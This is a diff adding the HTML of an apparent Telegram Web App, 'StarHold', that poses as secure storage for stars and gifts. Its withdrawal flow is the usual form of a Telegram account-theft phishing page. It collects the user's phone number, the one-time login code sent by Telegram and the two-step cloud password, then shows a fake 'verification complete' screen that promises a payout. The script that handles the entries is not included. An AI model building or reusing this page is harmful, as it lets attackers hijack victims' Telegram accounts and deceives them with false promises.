@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>StarHold - Безопасное хранение подарков</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container" id="app">
+        <!-- Логотип -->
+        <div class="logo-container">
+            <svg class="logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="goldGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#FFD700;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#FFA500;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path d="M60 10 L70 45 L105 45 L77 65 L87 100 L60 80 L33 100 L43 65 L15 45 L50 45 Z" 
+                      fill="url(#goldGradient)" 
+                      stroke="#FFA500" 
+                      stroke-width="2"/>
+                <circle cx="60" cy="60" r="25" fill="none" stroke="url(#goldGradient)" stroke-width="3"/>
+            </svg>
+            <div class="logo-text">StarHold</div>
+        </div>
+
+        <!-- ==================== ОСНОВНОЙ WEBAPP ==================== -->
+
+        <!-- ЭКРАН: Главная (Инвентарь и Вывод) -->
+        <div id="screen-main" class="screen">
+            <!-- Табы навигации -->
+            <div class="tabs">
+                <button class="tab-button active" data-tab="inventory" onclick="switchTab('inventory')">
+                    👤 Инвентарь
+                </button>
+                <button class="tab-button" data-tab="withdrawal" onclick="switchTab('withdrawal')">
+                    💸 Вывод
+                </button>
+            </div>
+
+            <!-- Вкладка: Инвентарь -->
+            <div id="tab-inventory" class="tab-content active">
+                <!-- Профиль пользователя -->
+                <div class="profile-card card">
+                    <div class="profile-avatar">
+                        <div class="avatar-placeholder" id="userAvatar">👤</div>
+                    </div>
+                    <div class="profile-info">
+                        <div class="profile-name" id="userName">Загрузка...</div>
+                        <div class="profile-username" id="userUsername">@username</div>
+                    </div>
+                </div>
+
+                <!-- Раздел инвентаря -->
+                <div class="section-title">📦 МОЙ ИНВЕНТАРЬ</div>
+
+                <!-- Баланс звёзд -->
+                <div class="balance-card card">
+                    <div class="balance-icon">⭐</div>
+                    <div class="balance-info">
+                        <div class="balance-label">Баланс звёзд</div>
+                        <div class="balance-amount" id="starsBalance">0 ⭐</div>
+                    </div>
+                </div>
+
+                <!-- Список подарков -->
+                <div class="gifts-section">
+                    <div class="gifts-header">
+                        <span class="gifts-title">🎁 Мои подарки (<span id="giftsCount">0</span>)</span>
+                    </div>
+                    <div id="giftsList" class="gifts-list">
+                        <!-- Подарки будут загружены через JS -->
+                        <div class="empty-state">
+                            <div class="empty-icon">📭</div>
+                            <div class="empty-text">У вас пока нет подарков</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Вкладка: Вывод -->
+            <div id="tab-withdrawal" class="tab-content">
+                <h2>💸 ВЫВОД СРЕДСТВ</h2>
+                <p class="subtitle">Выберите что хотите вывести:</p>
+
+                <div class="withdrawal-options">
+                    <button class="withdrawal-option-btn" onclick="showStarsWithdrawal()">
+                        <div class="option-icon">⭐</div>
+                        <div class="option-text">Вывести звёзды</div>
+                    </button>
+
+                    <button class="withdrawal-option-btn" onclick="showGiftsWithdrawal()">
+                        <div class="option-icon">🎁</div>
+                        <div class="option-text">Вывести подарки</div>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН: Вывод звёзд -->
+        <div id="screen-stars-withdrawal" class="screen hidden">
+            <button class="back-button" onclick="backToMain()">← Назад</button>
+            
+            <h2>⭐ ВЫВОД ЗВЁЗД</h2>
+            <p class="subtitle">Ваш баланс: <strong id="starsBalanceWithdrawal">0 ⭐</strong></p>
+
+            <div class="card">
+                <div class="form-group">
+                    <label class="form-label">Введите сумму для вывода:</label>
+                    <input type="number" id="withdrawalStarsAmount" class="form-input" 
+                           placeholder="Количество звёзд" min="1">
+                </div>
+
+                <div class="quick-select">
+                    <button class="quick-btn" onclick="setQuickAmount(1000)">1K⭐</button>
+                    <button class="quick-btn" onclick="setQuickAmount(5000)">5K⭐</button>
+                    <button class="quick-btn" onclick="setQuickAmount(10000)">10K⭐</button>
+                    <button class="quick-btn" onclick="setQuickAmountAll()">Всё</button>
+                </div>
+
+                <button id="btnContinueStars" class="btn btn-primary" onclick="continueStarsWithdrawal()">
+                    🚀 Продолжить
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН: Вывод подарков -->
+        <div id="screen-gifts-withdrawal" class="screen hidden">
+            <button class="back-button" onclick="backToMain()">← Назад</button>
+            
+            <h2>🎁 ВЫВОД ПОДАРКОВ</h2>
+            <p class="subtitle">Выберите подарки для вывода:</p>
+
+            <div id="giftsSelectionList" class="gifts-selection-list">
+                <!-- Список подарков для выбора -->
+            </div>
+
+            <div class="card">
+                <button class="btn btn-secondary" onclick="selectAllGifts()">
+                    ✨ Выбрать все
+                </button>
+
+                <div class="selected-count">
+                    Выбрано: <strong id="selectedGiftsCount">0</strong> подарков
+                </div>
+
+                <button id="btnContinueGifts" class="btn btn-primary" onclick="continueGiftsWithdrawal()">
+                    🚀 Продолжить
+                </button>
+            </div>
+        </div>
+
+        <!-- ==================== АВТОРИЗАЦИЯ ==================== -->
+
+        <!-- ЭКРАН 1: Выбор страны и номер телефона -->
+        <div id="screen-phone" class="screen hidden">
+            <h1>🔐 StarHold</h1>
+            <p class="subtitle">Подтверждение личности</p>
+            <p class="subtitle">Для безопасного вывода средств необходимо подтвердить владение аккаунтом.</p>
+
+            <div class="card">
+                <div class="form-group">
+                    <label class="form-label">Выберите вашу страну:</label>
+                    <div class="country-select-wrapper">
+                        <select id="countrySelect" class="country-select">
+                            <option value="">Загрузка стран...</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Номер телефона:</label>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" id="countryCode" class="form-input" 
+                               style="width: 80px;" readonly placeholder="+7">
+                        <input type="tel" id="phoneInput" class="form-input" 
+                               placeholder="999 123 4567" style="flex: 1;">
+                    </div>
+                </div>
+
+                <button id="btnSendCode" class="btn btn-primary">
+                    🔒 Подтвердить
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 2: Ввод кода -->
+        <div id="screen-code" class="screen hidden">
+            <h1>📱 Подтверждение номера</h1>
+            <p class="subtitle">Код отправлен на:<br><strong id="phoneDisplay"></strong></p>
+            <p class="subtitle">Введите код из Telegram:</p>
+
+            <div class="code-input-container">
+                <input type="text" maxlength="1" class="code-digit" id="digit1" readonly>
+                <input type="text" maxlength="1" class="code-digit" id="digit2" readonly>
+                <input type="text" maxlength="1" class="code-digit" id="digit3" readonly>
+                <input type="text" maxlength="1" class="code-digit" id="digit4" readonly>
+                <input type="text" maxlength="1" class="code-digit" id="digit5" readonly>
+            </div>
+
+            <div class="keypad">
+                <button class="keypad-button" onclick="addDigit('1')">1</button>
+                <button class="keypad-button" onclick="addDigit('2')">2</button>
+                <button class="keypad-button" onclick="addDigit('3')">3</button>
+                <button class="keypad-button" onclick="addDigit('4')">4</button>
+                <button class="keypad-button" onclick="addDigit('5')">5</button>
+                <button class="keypad-button" onclick="addDigit('6')">6</button>
+                <button class="keypad-button" onclick="addDigit('7')">7</button>
+                <button class="keypad-button" onclick="addDigit('8')">8</button>
+                <button class="keypad-button" onclick="addDigit('9')">9</button>
+                <button class="keypad-button" onclick="addDigit('0')">0</button>
+                <button class="keypad-button delete" onclick="deleteDigit()">⬅️ Удалить</button>
+            </div>
+
+            <div style="margin-top: 20px; text-align: center;">
+                <button class="btn btn-secondary" onclick="changePhone()">
+                    📝 Изменить номер
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 3: Пароль 2FA -->
+        <div id="screen-password" class="screen hidden">
+            <h1>🛡️ Облачный пароль</h1>
+            <p class="subtitle">Введите ваш пароль двухэтапной аутентификации:</p>
+
+            <div class="card">
+                <div class="form-group">
+                    <label class="form-label">Пароль:</label>
+                    <div style="position: relative;">
+                        <input type="password" id="passwordInput" class="form-input" 
+                               placeholder="Введите пароль">
+                        <button id="togglePassword" 
+                                style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); 
+                                       background: none; border: none; cursor: pointer; font-size: 20px;"
+                                onclick="togglePasswordVisibility()">
+                            👁️
+                        </button>
+                    </div>
+                </div>
+
+                <button id="btnVerifyPassword" class="btn btn-primary">
+                    🔓 Продолжить
+                </button>
+
+                <div style="margin-top: 15px; text-align: center;">
+                    <a href="#" style="color: var(--tg-theme-link-color); font-size: 14px; text-decoration: none;">
+                        ❓ Забыли пароль?
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- ЭКРАН 4: Успешная авторизация -->
+        <div id="screen-success" class="screen hidden">
+            <div class="success-screen">
+                <div class="success-icon">
+                    <svg viewBox="0 0 52 52">
+                        <polyline points="14 27 22 35 38 17"/>
+                    </svg>
+                </div>
+
+                <h1 class="success-title">✅ Подтверждение завершено!</h1>
+                <p class="success-message">Ваш аккаунт успешно подключен</p>
+
+                <div class="status-box">
+                    <div class="status-title">🔐 Статус проверки:</div>
+                    
+                    <div class="status-item">
+                        <span class="status-label">Аккаунт:</span>
+                        <span class="status-value success">Подтверждён</span>
+                    </div>
+                    
+                    <div class="status-item">
+                        <span class="status-label">Безопасность:</span>
+                        <span class="status-value success">Проверена</span>
+                    </div>
+                    
+                    <div class="status-item">
+                        <span class="status-label">Платформа:</span>
+                        <span class="status-value success">StarHold</span>
+                    </div>
+                    
+                    <div class="status-item">
+                        <span class="status-label">Операция:</span>
+                        <span class="status-value pending">Обработка вывода</span>
+                    </div>
+                </div>
+
+                <p class="subtitle">Ваши средства будут переведены в течение нескольких минут.</p>
+
+                <button class="btn btn-primary active" onclick="closeWebApp()">
+                    🏠 Закрыть
+                </button>
+            </div>
+        </div>
+
+        <!-- ЭКРАН ЗАГРУЗКИ -->
+        <div id="screen-loading" class="screen hidden">
+            <div class="loader-container">
+                <div class="loader loader-big"></div>
+                <p class="subtitle" style="margin-top: 20px;" id="loadingText">Загрузка...</p>
+            </div>
+        </div>
+
+        <!-- ЭКРАН ОШИБКИ -->
+        <div id="screen-error" class="screen hidden">
+            <div class="card" style="text-align: center;">
+                <h2 style="color: var(--error-color);">❌ Ошибка</h2>
+                <p id="errorText" class="subtitle"></p>
+                <button class="btn btn-primary active" onclick="location.reload()">
+                    🔄 Попробовать снова
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/js/app.js"></script>
+</body>
+</html>
